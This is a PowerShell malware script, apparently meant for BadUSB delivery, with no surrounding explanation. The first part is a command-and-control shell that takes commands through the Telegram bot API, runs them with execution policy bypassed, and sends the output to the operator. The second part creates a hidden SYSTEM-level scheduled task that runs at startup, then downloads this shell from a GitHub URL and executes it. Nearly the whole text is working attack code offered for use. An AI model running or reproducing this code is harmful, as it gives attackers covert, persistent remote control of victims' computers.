$botToken = "YOUR_BOT_TOKEN"
$chatID = "YOUR_CHAT_ID"
$apiURL = "https://api.telegram.org/bot$botToken"
$lastUpdateID = 0

function Send-TelegramMessage {
    param ($message)
    $message = [uri]::EscapeDataString($message)
    $url = "$apiURL/sendMessage?chat_id=$chatID&text=$message"
    try {
        Invoke-RestMethod -Uri $url -Method Get | Out-Null
    } catch {
        Write-Host "Failed to send message: $_"
    }
}

function Get-TelegramCommands {
    param ($offset)
    $url = "$apiURL/getUpdates?offset=$offset"
    try {
        $response = Invoke-RestMethod -Uri $url -Method Get
        return $response.result
    } catch {
        return @()
    }
}

Send-TelegramMessage "Reverse shell connected!"

while ($true) {
    $updates = Get-TelegramCommands -offset $lastUpdateID
    foreach ($update in $updates) {
        $lastUpdateID = $update.update_id + 1
        if ($update.message.text) {
            $command = $update.message.text
            try {
                $output = & powershell -NoProfile -ExecutionPolicy Bypass -Command $command 2>&1
                if ($output -is [System.Array]) {
                    $output = $output -join "`n"
                }
            } catch {
                $output = $_.Exception.Message
            }
            Send-TelegramMessage $output
        }
    }
    Start-Sleep -Seconds 3
}
$taskName = "Auto GitHub Script"
$scriptUrl = "https://raw.githubusercontent.com/Eikakka123/Badusbb/main/telegram-shell.ps1"
$scriptPath = "$env:TEMP\script.ps1"

# Function to check if the task already exists
function TaskExists {
    return Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
}

# First-time setup: Create the scheduled task if it doesn't exist
if (-not (TaskExists)) {
    Write-Host "Setting up auto-start task..."

    # Define the task action
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"

    # Define the trigger (at startup)
    $trigger = New-ScheduledTaskTrigger -AtStartup

    # Create the scheduled task
    Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -RunLevel Highest -User "SYSTEM" -Force

    Write-Host "Startup task created! The script will now auto-run after reboots."
}

# Download the latest script from GitHub
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

# Execute the downloaded script
powershell.exe -ExecutionPolicy Bypass -File $scriptPath
